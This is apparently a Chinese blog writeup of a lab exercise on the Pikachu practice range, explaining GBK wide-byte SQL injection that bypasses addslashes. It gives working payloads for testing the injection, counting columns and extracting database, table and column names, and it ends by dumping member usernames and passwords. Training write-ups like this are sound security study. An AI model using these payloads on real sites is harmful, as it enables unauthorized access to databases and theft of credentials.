---
title: Pikachu 宽字节注入Writeup
date: 2026-10-30
category: Web安全
tags: [SQL注入, 宽字节注入, 转义绕过, Pikachu]
---
## 一、实验环境

靶场：Pikachu
页面：sqli_widebyte.php
注入类型：宽字节注入（GBK编码绕过单引号转义）

## 二、漏洞原理

后端PHP使用 addslashes() 对输入进行过滤：遇到单引号 '，自动转义成 \'，把单引号“吃掉”，正常单引号注入就失效了。
数据库设置为 GBK编码，GBK是双字节中文编码：
我们输入 %df'

• %df + \（%5c）组合在一起，会被GBK解析成一个汉字：運（%df%5c）

• 原本用来转义的反斜杠 \ 被吃掉了，剩下的 ' 成功逃逸出来，实现单引号闭合！
一句话：利用GBK编码，吃掉转义反斜杠，绕过 addslashes。
底层SQL：
select username from user where username='$name';
## 三、测试payload（输入框）

输入：
%df' and 1=1 #
拼接原理：
传入 %df' → php转义变成 %df\'
MySQL按GBK解析：%df%5c = 汉字，剩下 ' 成功闭合
SQL变成：
select username from user where username='%df' and 1=1 #';
✅ 页面返回正常（yes）

再测试：
%df' and 1=2 #
❌ 页面返回no
证明注入成功。
⚠️ 注意：直接在浏览器地址栏输入 %df' 会自动URL编码，建议Burp抓包修改，或者输入框直接填 %df'
## 四、注入步骤（union联合查询，有回显）

这一关是有回显的，直接union查询，不用盲注！

1. 判断列数
%df' order by 2 #
页面正常；试 order by 3 报错，说明一共2列。

2. 联合查询，爆库名
%df' union select database(),2 #
可以直接看到库名 pikachu

3. 爆表名
%df' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
4. 爆member表字段
%df' union select group_concat(column_name),2 from information_schema.columns where table_name='member' #
5. 脱库，读取账号密码
%df' union select group_concat(username,0x3a,pw),2 from member #
0x3a 是冒号


2. 获取账号、密码等敏感数据。

